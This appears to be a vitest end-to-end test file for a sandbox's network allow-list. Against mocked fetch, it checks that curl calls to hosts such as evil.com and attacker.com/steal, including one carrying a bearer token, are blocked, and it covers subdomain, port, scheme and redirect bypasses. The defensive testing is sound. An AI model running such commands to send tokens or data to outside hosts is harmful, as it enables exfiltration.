/**
 * E2E tests for allow-list enforcement via bash execution
 *
 * These tests verify that the allow-list is correctly enforced when using
 * curl commands through BashEnv and Sandbox.create.
 */

import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import {
  type AdapterFactory,
  createBashEnvAdapter,
  createMockFetch,
  createSandboxAdapter,
  MOCK_EVIL_BODY,
  MOCK_FILE_BODY,
  MOCK_POSTS_BODY,
  MOCK_SUCCESS_BODY,
  MOCK_USERS_BODY,
  originalFetch,
} from "./shared.js";

/**
 * Runs the allow-list test suite with a given adapter factory
 */
function runAllowListTests(name: string, createAdapter: AdapterFactory) {
  describe(`allow-list e2e via ${name}`, () => {
    let mockFetch: ReturnType<typeof createMockFetch>;

    beforeAll(() => {
      mockFetch = createMockFetch();
      global.fetch = mockFetch as typeof fetch;
    });

    afterAll(() => {
      global.fetch = originalFetch;
      vi.restoreAllMocks();
    });

    describe("basic allow-list enforcement", () => {
      it("allows requests to URLs in allow-list", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec("curl https://api.example.com/data");
        expect(result.exitCode).toBe(0);
        expect(result.stdout).toBe(MOCK_SUCCESS_BODY);
        expect(result.stderr).toBe("");
      });

      it("blocks requests to URLs not in allow-list", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec("curl https://evil.com/data");
        expect(result.exitCode).toBe(7);
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://evil.com/data\n",
        );
        expect(result.stdout).toBe("");
      });

      it("returns proper exit code for blocked requests", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec("curl https://attacker.com/steal");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://attacker.com/steal\n",
        );
      });
    });

    describe("path prefix restrictions", () => {
      it("allows URLs with matching path prefix", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com/v1/"] },
        });
        const result = await env.exec("curl https://api.example.com/v1/users");
        expect(result.exitCode).toBe(0);
        expect(result.stdout).toBe(MOCK_USERS_BODY);
        expect(result.stderr).toBe("");
      });

      it("allows multiple paths under same prefix", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com/v1/"] },
        });
        const r1 = await env.exec("curl https://api.example.com/v1/users");
        const r2 = await env.exec("curl https://api.example.com/v1/posts");
        expect(r1.exitCode).toBe(0);
        expect(r2.exitCode).toBe(0);
        expect(r1.stdout).toBe(MOCK_USERS_BODY);
        expect(r2.stdout).toBe(MOCK_POSTS_BODY);
        expect(r1.stderr).toBe("");
        expect(r2.stderr).toBe("");
      });

      it("blocks URLs with different path prefix", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com/v1/"] },
        });
        const result = await env.exec("curl https://api.example.com/v2/users");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://api.example.com/v2/users\n",
        );
      });

      it("blocks when path does not include trailing slash", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com/v1/"] },
        });
        const result = await env.exec("curl https://api.example.com/v1");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://api.example.com/v1\n",
        );
      });
    });

    describe("multiple allow-list entries", () => {
      it("allows URLs matching any entry", async () => {
        const env = await createAdapter({
          network: {
            allowedUrlPrefixes: [
              "https://api.example.com",
              "https://cdn.example.com",
            ],
          },
        });

        const r1 = await env.exec("curl https://api.example.com/data");
        const r2 = await env.exec("curl https://cdn.example.com/file.txt");

        expect(r1.exitCode).toBe(0);
        expect(r1.stdout).toBe(MOCK_SUCCESS_BODY);
        expect(r1.stderr).toBe("");
        expect(r2.exitCode).toBe(0);
        expect(r2.stdout).toBe(MOCK_FILE_BODY);
        expect(r2.stderr).toBe("");
      });

      it("blocks URLs not matching any entry", async () => {
        const env = await createAdapter({
          network: {
            allowedUrlPrefixes: [
              "https://api.example.com",
              "https://cdn.example.com",
            ],
          },
        });

        const result = await env.exec("curl https://evil.com/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://evil.com/data\n",
        );
      });
    });

    describe("security scenarios via curl", () => {
      it("blocks host suffix attacks", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://example.com"] },
        });
        const result = await env.exec("curl https://evilexample.com/path");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://evilexample.com/path\n",
        );
      });

      it("blocks subdomain attacks", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://example.com"] },
        });
        const result = await env.exec("curl https://evil.example.com/path");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://evil.example.com/path\n",
        );
      });

      it("blocks scheme downgrade attacks", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec("curl http://api.example.com/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: http://api.example.com/data\n",
        );
      });

      it("blocks port confusion attacks", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec("curl https://api.example.com:8080/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://api.example.com:8080/data\n",
        );
      });

      it("blocks IP address access when domain allowed", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec("curl https://127.0.0.1/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://127.0.0.1/data\n",
        );
      });

      it("blocks localhost access when domain allowed", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec("curl https://localhost/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://localhost/data\n",
        );
      });
    });

    describe("redirect handling", () => {
      it("blocks redirects to disallowed URLs", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec(
          "curl https://api.example.com/redirect-to-evil",
        );
        expect(result.exitCode).toBe(47);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (47) Redirect target not in allow-list: https://evil.com/data\n",
        );
      });

      it("allows redirects to allowed URLs", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec(
          "curl https://api.example.com/redirect-to-allowed",
        );
        expect(result.exitCode).toBe(0);
        expect(result.stdout).toBe(MOCK_SUCCESS_BODY);
        expect(result.stderr).toBe("");
      });

      it("handles redirect chains within allow-list", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });
        const result = await env.exec(
          "curl https://api.example.com/redirect-chain",
        );
        expect(result.exitCode).toBe(0);
        expect(result.stdout).toBe(MOCK_SUCCESS_BODY);
        expect(result.stderr).toBe("");
      });
    });

    describe("curl options with allow-list", () => {
      it("respects allow-list with -X POST", async () => {
        const env = await createAdapter({
          network: {
            allowedUrlPrefixes: ["https://api.example.com"],
            allowedMethods: ["GET", "POST"],
          },
        });

        const r1 = await env.exec("curl -X POST https://api.example.com/data");
        expect(r1.exitCode).toBe(0);
        expect(r1.stdout).toBe(MOCK_SUCCESS_BODY);
        expect(r1.stderr).toBe("");

        const r2 = await env.exec("curl -X POST https://evil.com/data");
        expect(r2.exitCode).toBe(7);
        expect(r2.stdout).toBe("");
        expect(r2.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://evil.com/data\n",
        );
      });

      it("respects allow-list with -H headers", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        const result = await env.exec(
          'curl -H "Authorization: Bearer token" https://evil.com/data',
        );
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://evil.com/data\n",
        );
      });

      it("silent mode hides blocked request error", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        const result = await env.exec("curl -s https://evil.com/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe("");
      });

      it("-sS shows error for blocked requests", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        const result = await env.exec("curl -sS https://evil.com/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://evil.com/data\n",
        );
      });
    });

    describe("dangerouslyAllowFullInternetAccess", () => {
      it("allows any URL when enabled", async () => {
        const env = await createAdapter({
          network: { dangerouslyAllowFullInternetAccess: true },
        });

        const r1 = await env.exec("curl https://api.example.com/data");
        const r2 = await env.exec("curl https://evil.com/data");

        expect(r1.exitCode).toBe(0);
        expect(r1.stdout).toBe(MOCK_SUCCESS_BODY);
        expect(r1.stderr).toBe("");
        expect(r2.exitCode).toBe(0);
        expect(r2.stdout).toBe(MOCK_EVIL_BODY);
        expect(r2.stderr).toBe("");
      });

      it("allows redirects to any URL when enabled", async () => {
        const env = await createAdapter({
          network: { dangerouslyAllowFullInternetAccess: true },
        });

        const result = await env.exec(
          "curl https://api.example.com/redirect-to-evil",
        );
        expect(result.exitCode).toBe(0);
        expect(result.stdout).toBe(MOCK_EVIL_BODY);
        expect(result.stderr).toBe("");
      });
    });

    describe("edge cases", () => {
      it("handles URL without protocol", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        const result = await env.exec("curl api.example.com/data");
        expect(result.exitCode).toBe(0);
        expect(result.stdout).toBe(MOCK_SUCCESS_BODY);
        expect(result.stderr).toBe("");
      });

      it("blocks URL without protocol when not allowed", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        const result = await env.exec("curl evil.com/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://evil.com/data\n",
        );
      });

      it("handles empty allow-list", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: [] },
        });

        const result = await env.exec("curl https://api.example.com/data");
        expect(result.exitCode).toBe(7);
        expect(result.stdout).toBe("");
        expect(result.stderr).toBe(
          "curl: (7) Network access denied: URL not in allow-list: https://api.example.com/data\n",
        );
      });
    });

    describe("piping curl output", () => {
      it("pipes allowed response to other commands", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        const result = await env.exec(
          "curl https://api.example.com/data | grep success",
        );
        expect(result.exitCode).toBe(0);
        expect(result.stdout).toBe(`${MOCK_SUCCESS_BODY}\n`);
        expect(result.stderr).toBe("");
      });

      it("blocked requests produce no output to pipe", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        const result = await env.exec(
          "curl -s https://evil.com/data | wc -c | tr -d ' '",
        );
        expect(result.stdout.trim()).toBe("0");
        expect(result.stderr).toBe("");
      });
    });

    describe("curl with file output", () => {
      it("writes to file only for allowed URLs", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        await env.exec("curl -o /output.json https://api.example.com/data");
        const content = await env.readFile("/output.json");
        expect(content).toBe(MOCK_SUCCESS_BODY);
      });

      it("does not create file for blocked URLs", async () => {
        const env = await createAdapter({
          network: { allowedUrlPrefixes: ["https://api.example.com"] },
        });

        await env.exec("curl -o /output.json https://evil.com/data");
        await expect(env.readFile("/output.json")).rejects.toThrow();
      });
    });
  });
}

// Run tests with both BashEnv and Sandbox adapters
runAllowListTests("BashEnv", createBashEnvAdapter);
runAllowListTests("Sandbox", createSandboxAdapter);
